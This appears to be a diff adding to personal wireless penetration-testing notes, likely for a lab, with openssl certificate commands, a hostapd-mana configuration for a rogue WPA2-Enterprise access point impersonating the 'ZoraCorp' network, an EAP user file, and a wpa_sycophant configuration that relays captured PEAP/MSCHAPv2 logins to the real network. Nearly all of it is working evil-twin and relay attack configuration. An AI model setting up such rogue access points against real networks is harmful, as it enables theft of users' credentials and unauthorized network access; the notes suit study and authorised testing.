@@ -35,3 +35,59 @@ wpa_passphrase=dummypassword
 wpa_key_mgmt=WPA-PSK
 rsn_pairwise=TKIP CCMP
 channel=[channel # of client]
+
+#Certificate Generation for WPA2
+openssl genrsa -out server.key 2048
+openssl dhparam -out dhparam.pem 1024
+
+#WPA2 CCMP MGT
+#HOSTAPD-MANA setup
+#hostapd-mana.conf
+interface=wlan1
+ssid=ZoraCorp
+channel=11
+hw_mode=g
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+auth_algs=3
+ieee8021x=1
+eapol_key_index_workaround=0
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/root/certs/ca.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+private_key_passwd=
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+enable_mana=1
+enable_sycophant=1
+sycophant_dir=/tmp/
+
+#hostapd.eap_user
+*       PEAP,TTLS,TLS,MD5,GTC
+"t"     TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP "1234test" [2]
+
+#wpa_sycophant_example.conf
+network={
+  ssid="ZoraCorp"
+  # The SSID you would like to relay and authenticate against. 
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  # Do not modify
+  identity=""
+  anonymous_identity=""
+  password=""
+  # This initialises the variables for me.
+  # -------------
+  eap=PEAP
+  phase1="crypto_binding=0 peaplabel=0"
+  phase2="auth=MSCHAPV2"
+  # Dont want to connect back to ourselves,
+  # so add your rogue BSSID here.
+  bssid_blacklist=02:00:00:00:01:00
+}
+
+
